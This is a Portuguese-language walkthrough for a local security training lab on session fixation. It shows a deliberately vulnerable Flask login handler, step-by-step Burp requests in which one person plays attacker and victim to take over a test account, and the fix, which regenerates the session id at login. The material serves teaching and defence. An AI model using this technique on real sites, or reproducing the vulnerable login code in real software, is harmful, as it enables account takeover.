# Walkthrough — session-fixation

## 1. Contexto

A app é um portal de conta minúsculo. `GET /` te dá uma sessão e mostra se você está anônimo ou logado, mais um form de login. `POST /login` autentica. `GET /account` é uma página protegida que só uma sessão autenticada pode ver. É a feature inteira. Isto é **A07 — session fixation**.

Duas coisas tornam este átomo diferente de todos os anteriores. Primeiro, é o primeiro bug de **sessão** do projeto: a identidade é carregada por uma sessão server-side com um cookie `session_id` opaco, não por um header nem por um token que você forja. Segundo, o ataque tem **dois atores em dois momentos** — um atacante que planta um session id *antes* do login, e uma vítima que o autentica. Não há uma segunda máquina neste lab: **você joga os dois papéis**, e cada passo abaixo é rotulado **COMO ATACANTE** ou **COMO VÍTIMA** pra você sempre saber qual chapéu está usando.

Como o `idor-numeric-id`, este não é um bug input-driven — não tem payload. O "exploit" é um session id perfeitamente legítimo, usado na hora errada. O request que causa o dano é um `GET /account` simples com um cookie válido.

Trilha: **o Burp Suite é a principal** — você vai setar o header `Cookie` explicitamente em cada request, e é esse controle na mão que permite uma pessoa segurar os dois papéis com um único id.

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py) e leia o `POST /login`:

```python
@app.route("/login", methods=["POST"])
def login():
    sid, sess = current_session()
    user = request.form.get("user", "")
    password = request.form.get("password", "")
    if CREDENTIALS.get(user) != password:
        abort(401)
    # VULNERABLE: authenticate the CURRENT session, keeping the SAME session_id. ...
    sess["authenticated"] = True
    sess["user"] = user
    return redirect("/account")  # cookie unchanged — the pre-login sid is now authenticated
```

O check de credenciais está ok. O bug é o que acontece *depois* dele: o handler vira a sessão atual pra `authenticated` **no lugar** e retorna — ele nunca emite um `session_id` novo. Faça uma pergunta de auditoria a qualquer handler de login: **"o session id muda quando o nível de privilégio muda?"** Aqui a resposta é *não*. A sessão que você tinha enquanto anônimo — um id que qualquer um poderia ter te entregado — agora é uma sessão *autenticada*. Isso é session fixation, e o fix (seção 8) é exatamente o passo ausente: regenerar o id no login.

## 3. Como funcionam as sessões deste lab

A identidade é rastreada por uma **sessão server-side**: um dict `SESSIONS = {session_id: {...}}` no servidor, e um cookie `session_id` opaco que carrega só o id. É o padrão `PHPSESSID` / `JSESSIONID` usado pela maioria dos frameworks server-side.

A app deliberadamente **não** usa o `session` nativo do Flask. Aquele é um *cookie assinado client-side*: os dados viajam no cookie, e o valor dele muda no instante em que você loga (agora codifica o user autenticado) — então ele regenera por design e não tem um id server-side fixo pra fixar. Session fixation não vive lá. Vive em sessões server-side com um id no cookie, que é o que este átomo modela. (Mais em [`DIFF.pt-BR.md`](./DIFF.pt-BR.md).)

Uma conveniência do lab: as páginas imprimem o `session_id` atual na tela. Apps reais não fazem isso — ele aparece aqui pra você observar o id através do login num relance. Num engagement real você o leria do header `Set-Cookie` no Burp ou do DevTools.

## 4. Baseline — a app funcionando

Aponte o browser pro Burp e visite <http://127.0.0.1:8015/>, depois mande os requests pro Repeater. Primeiro o fluxo legítimo, pra você saber como é o "normal".

`GET /` sem cookie:

```
GET / HTTP/1.1
Host: 127.0.0.1:8015
```

Response — o servidor cunha uma sessão e te entrega o id:

```
HTTP/1.1 200 OK
Set-Cookie: session_id=-bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso; HttpOnly; Path=/; SameSite=Lax
...
Status: anonymous (not logged in)
Your session id: -bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso
```

(Seu id vai ser diferente — session ids são valores aleatórios `secrets.token_urlsafe(32)`. O que importa abaixo nunca é o valor, só se ele *muda*.) Logue e visite `/account` e você tem a página da alice. Uso normal, legítimo.

## 5. Exploração via Burp Suite (trilha principal)

Agora o ataque, em três beats. Como você seta o header `Cookie` na mão em cada request, dá pra agir como atacante, depois vítima, depois atacante de novo — todos carregando um session id.

### Passo 1 — COMO ATACANTE (parte 1): pegar um session id

Mande `GET /` **sem cookie** e leia o `Set-Cookie` da response:

```
GET / HTTP/1.1
Host: 127.0.0.1:8015
```

```
HTTP/1.1 200 OK
Set-Cookie: session_id=-bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso; HttpOnly; Path=/; SameSite=Lax
```

Chame esse valor de **SID_A**. É uma sessão anônima comum — o servidor entrega uma pra qualquer um. Num ataque real este é o id que você **plantaria** no navegador da vítima antes de ela logar (uma URL preparada, um cookie de subdomínio, um `document.cookie` via XSS). Aqui você só anota. Nada foi quebrado: pegar um id anônimo é permitido.

### Passo 2 — COMO VÍTIMA: autenticar o SID_A

Troque de chapéu. A vítima loga **normalmente, com a própria senha**, numa sessão que por acaso carrega o SID_A. Sete o cookie pra SID_A e poste as credenciais reais:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8015
Cookie: session_id=-bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

user=alice&password=password123
```

```
HTTP/1.1 302 FOUND
Location: /account
```

Olhe os headers da response: **não tem `Set-Cookie`.** O servidor autenticou a sessão mas deixou o id em paz. Confirme lendo `/account` com o mesmo cookie:

```
GET /account HTTP/1.1
Host: 127.0.0.1:8015
Cookie: session_id=-bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso
```

```
HTTP/1.1 200 OK
...
Signed in as alice.
Your session id: -bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso
```

**PROVA-CHAVE:** o session id é **SID_A antes do login e SID_A depois do login** — byte a byte. A vítima fez tudo certo (a conta dela, a senha dela), mas o id que agora identifica a sessão *autenticada* dela é o do passo 1.

### Passo 3 — COMO ATACANTE (parte 2): entrar na sessão autenticada

De volta ao atacante. Num request **separado** — o contexto do próprio atacante, que só conheceu o SID_A — bata na página protegida:

```
GET /account HTTP/1.1
Host: 127.0.0.1:8015
Cookie: session_id=-bAZaAFCANLXt_Ze85jW-FeHTyeemYigp14LuwPabso
```

```
HTTP/1.1 200 OK
...
Signed in as alice.
Email: alice@example.test · Plan: Pro · Balance: $4,200.00
```

Você está dentro da conta autenticada da alice. Você nunca submeteu a senha dela, nunca a viu, nunca adivinhou nada. Você entregou um id a ela, ela logou, e o id que você já tinha agora está autenticado como ela. Isso é session fixation.

## 6. O que a vuln NÃO é

Este passo isola a causa e afasta os parecidos. Cada um é checável no Repeater.

- **NÃO é adivinhar o session id.** O id é `secrets.token_urlsafe(32)` — 256 bits de aleatoriedade, impossível de adivinhar. Você não adivinhou; o servidor te *entregou* no passo 1. Um id fraco e previsível seria um bug *diferente*; aqui o id é forte e o bug é ele sobreviver ao login.
- **NÃO é crackear nem saber a senha.** A vítima digitou a própria senha correta no passo 2. Seu tráfego, como atacante, foi só `GET /` (passo 1) e `GET /account` (passo 3) — você nunca mandou credencial. O login foi 100% legítimo.
- **NÃO é session hijacking.** Hijacking *rouba* um id já autenticado, *depois* do login (sniffing, XSS lendo o cookie). Você fez o oposto: *forneceu* um id *antes* do login e deixou a vítima autenticá-lo. Você nunca leu o cookie autenticado dela — você teve o id desde antes de ela logar. Direção (dar vs subtrair) e timing (antes vs depois) são a diferença inteira.
- **NÃO é problema de flag de cookie.** Olhe de novo o `Set-Cookie` do passo 1: `HttpOnly; SameSite=Lax` já estão lá — e o ataque funcionou mesmo assim. Essas flags param o *roubo* de cookie (hijacking); não fazem nada contra fixation, porque você nunca precisou ler o cookie da vítima. Você não "conserta" isso adicionando `HttpOnly`; já está ligado. (`Secure` fica de fora só porque o lab é HTTP puro; ele também é irrelevante pra fixation.)
- **E o servidor não adota cegamente qualquer id que você invente.** Mande `GET /` com `Cookie: session_id=inventado_por_mim` — a response dá `Set-Cookie` com um id *novo* gerado pelo servidor, não o seu inventado. O servidor só fixa ids que **ele** emitiu. Então a única superfície é a não-regeneração no login, nada mais.

O que **é**, cirurgicamente: o session id é o mesmo antes e depois do login (SID_A == SID_A). Mude esse único fato e o ataque morre — que é exatamente o que o fix faz.

## 7. Impacto

Captura de sessão / account takeover. Com um session id plantado e zero conhecimento da senha da vítima, o atacante acaba dentro da sessão autenticada dela — lendo a conta dela, agindo como ela. **Não** é RCE, e o atacante nunca descobre a senha; o poder vem inteiramente de cavalgar uma sessão que a vítima elevou em nome do atacante.

## 8. Por que o fix funciona (porta 8115)

Rode os mesmos três beats contra a app fixed em <http://127.0.0.1:8115/>.

- **Passo 1 (atacante):** `GET /` → um id anônimo, igual antes. Chame de SID_A (neste run, `s8lxO7-5QDEfHj7Dwb3ie0rSEXt1868kjG0Rz0a1YC0`).
- **Passo 2 (vítima):** `POST /login` com `Cookie: session_id=SID_A` e a senha da alice → `302`, mas desta vez a response carrega um **`Set-Cookie` com um id novinho**:

```
HTTP/1.1 302 FOUND
Location: /account
Set-Cookie: session_id=K2TKaBYp48f8Z0e8rDKPNpHFjGSF8UcNbCGmUeBT8PM; HttpOnly; Path=/; SameSite=Lax
```

O id mudou no login: SID_A → **SID_B**. A sessão autenticada da vítima vive sob o SID_B, que o atacante nunca viu.

- **Passo 3 (atacante):** replay `GET /account` com o `Cookie: session_id=SID_A` plantado:

```
HTTP/1.1 302 FOUND
Location: /
```

Redirecionado pra tela de login — sem conta. O SID_A foi **descartado** no login (a app fixed dá `del` nele), então ele não identifica nada. Confirme o descarte: `GET /` com `Cookie: session_id=SID_A` agora faz o servidor cunhar mais um id novo em vez de reusar o SID_A — o id plantado sumiu do store por inteiro.

Todo o resto é idêntico — mesmos endpoints, mesmos templates, mesmos ids fortes `secrets.token_urlsafe`, mesmas flags de cookie. A única mudança é que o `/login` fixed **regenera** o session id no momento da autenticação. Ver [`DIFF.pt-BR.md`](./DIFF.pt-BR.md).
